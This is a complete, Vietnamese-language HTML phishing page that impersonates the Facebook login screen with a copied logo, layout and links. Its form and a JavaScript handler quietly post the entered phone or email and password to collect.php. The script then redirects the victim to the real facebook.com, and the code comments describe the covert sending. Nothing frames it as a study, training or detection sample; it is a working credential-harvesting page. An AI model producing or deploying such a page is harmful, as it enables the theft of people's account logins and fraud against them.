<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Đăng nhập</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #1c1e21;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .fb-logo {
            width: 75px;
            height: 75px;
            margin-bottom: 25px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #dddfe2;
            border-radius: 12px;
            background-color: #ffffff;
            outline: none;
            color: #1c1e21;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .input-field::placeholder {
            color: #8a8d91;
        }

        .btn-login {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            color: #ffffff;
            background-color: #1877f2;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 4px;
            transition: background-color 0.2s;
        }

        .btn-login:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            margin-top: 16px;
            margin-bottom: 24px;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .btn-create {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            font-weight: bold;
            color: #1877f2;
            background-color: transparent;
            border: 1px solid #1877f2;
            border-radius: 20px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-create:hover {
            background-color: #e7f3ff;
        }

        .footer-logo {
            margin-top: 40px;
            color: #8a8d91;
            font-size: 12px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Logo Facebook -->
        <svg class="fb-logo" viewBox="0 0 36 36" fill="#1877f2">
            <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.344 5.682 15.358 13.348 17.373v-12.29H9.13v-5.083h4.218v-3.873c0-4.162 2.48-6.458 6.27-6.458 1.815 0 3.712.324 3.712.324v4.08h-2.09c-2.063 0-2.707 1.28-2.707 2.593v3.334h4.6l-.735 5.083h-3.865v12.29z"/>
        </svg>

        <!-- Form Đăng Nhập trỏ tới collect.php -->
        <form id="loginForm" action="collect.php" method="POST">
            <input 
                type="text" 
                name="username"
                class="input-field" 
                placeholder="Số di động hoặc email" 
                required
            >
            <input 
                type="password" 
                name="password"
                class="input-field" 
                placeholder="Mật khẩu" 
                required
            >
            <button type="submit" class="btn-login">Đăng nhập</button>
        </form>

        <a href="https://www.facebook.com/login/identify" class="forgot-password">Quên mật khẩu?</a>

        <button class="btn-create" onclick="window.location.href='https://www.facebook.com/r.php'">Tạo tài khoản mới</button>

        <div class="footer-logo">Meta</div>
    </div>

    <script>
        // Xử lý gửi dữ liệu ngầm qua Fetch API tới collect.php rồi chuyển hướng sang trang thật
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Ngăn form reload trang trực tiếp
            
            const formData = new FormData(this);

            // Gửi dữ liệu bất đồng bộ đến file xử lý PHP
            fetch('collect.php', {
                method: 'POST',
                body: formData
            }).finally(() => {
                // Chuyển hướng sang trang web chính thức sau khi gửi xong
                window.location.href = 'https://www.facebook.com';
            });
        });
    </script>

</body>
</html>
